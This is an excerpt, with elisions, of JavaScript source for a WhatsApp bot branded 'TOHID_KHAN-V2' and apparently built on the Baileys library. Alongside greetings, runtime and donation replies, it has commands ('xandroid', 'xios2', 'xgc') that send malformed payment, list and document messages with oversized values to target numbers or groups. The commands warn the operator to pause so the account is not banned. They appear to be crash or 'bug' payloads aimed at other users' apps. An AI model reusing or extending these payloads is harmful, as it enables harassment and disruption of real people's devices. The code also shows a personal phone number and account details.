...
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        ...
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `This is 𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2҉. created by mr Tohid 👑. You are still awake by this time😫, you should get some rest🫠. Go and sleep naaaa, Anyways Good 🌃 Night o😅`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `This is 𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2҉. created by Mr Tohid 👑. The day is almost drawing near, you should get some rest🫠. Anyways Good evening 🤭`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `This is 𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2҉. created by Mr Tohid 👑. The day is almost drawing near, you should get some rest🫠. Anyways Good evening 🤭`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `This is 𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2҉ created by Mr Tohid 👑. The weather is freaking hot😫😫😫😕, I wan die ooo Anyways Good afternoon 😞`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `This is 𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2҉. created by Mr Tohid 👑. Hope you slept well shaaa, anyways Good morning 🤭`
 } 
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/042cd0b6121a7923fd5d2.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      ...
      'footerText': "𝐓𝐎𝐇𝐈𝐃 𝐊𝐇𝐀𝐍 ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "𝐓𝐎𝐇𝐈𝐃 𝐊𝐇𝐀𝐍 ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
...
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"ᴛᴏʜɪᴅ_ᴋʜᴀɴ-𝚅𝟸 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
...
💻 TOHID_KHAN-V2 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_TOHID_KHAN-V2 NodeJS Memory Usage🚧_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_TOHID_KHAN-V2 Total CPU Usage🧑‍🔧_
...
`.trim()
            ...
            case 'buyprem':
            case 'premium': {
                let teks = `Wag wan ${pushname}👋\nWant to Buy Premium? Just chat with Mr Tohid 👑😉👉917849917350`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
            ...
            break
            case 'runtime':
                let runtimetext = `𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2҉ 𝐇𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}`
                XeonBotInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                ...
                XeonBotInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on GITHUB @Tohidkhan6332`,
                            thumbnailUrl: 'https://telegra.ph/file/042cd0b6121a7923fd5d2.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
            ...
            case 'donasi':
                ...
                XeonBotInc.sendMessage(m.chat, {
                    text: 'Zenith 🏦 Acct No: 917849917350😊 Acct Name: Paschal JE\n\n' + textnate
                }, {
                    quoted: m
                })
                break
...
XeonBotInc.sendMessage(from, { text : `Hello Setting kya hal hai tere @${sender.split("@")[0]}, My  handsome owner is no other person than Mr Tohid 👑,i just love that dude so much`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
...
case "xandroid": {
  ...
  sendMessageWithMentions(
    ...
    " Using *" + command + "* ✅\n\nPause for 2mins so that  𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2 doesn't get your account banned✅. Thank you for choosing 𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2҉", 
    [whatsappNumber]
  );
}
break;
...
case "xios2":
  ...
  case "xgc":
  {
    ...
    try {
      ...
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*DONE✅ TOHID_KHAN-V2 HAS BEEN SENT TO THE GROUP!.*");
...
await XeonBotInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + xeontext1,
    'mimetype': "application/zip",
    'caption': "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + xeontext1,
...
title: `Xeon's ur father`
  ...
  XeonBotInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2${xeontext11}`,
      caption: `𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2 ${xeontext11}`,
    },
